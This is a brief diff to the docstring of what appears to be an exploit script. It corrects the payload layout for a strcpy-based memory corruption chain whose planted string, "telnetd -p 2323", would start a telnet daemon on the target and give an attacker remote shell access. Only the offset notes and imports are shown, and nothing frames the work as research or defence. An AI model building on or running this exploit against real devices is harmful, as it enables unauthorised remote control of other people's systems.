@@ -9,7 +9,7 @@ Chain (all offsets relative to the strcpy destination session+6380):
   string at B: "telnetd -p 2323\0"
 
 Wire format: TOC {type=2, off=0x25, len=24000} + payload; observer cell at
-node offset 23620 = file offset 23657 (proven layout).
+node offset 23620 = file offset 23656 (proven layout: magic 4 + TOC 27 + codec 5 = 36; 36+23620=23656).
 """
 import struct, sys
 
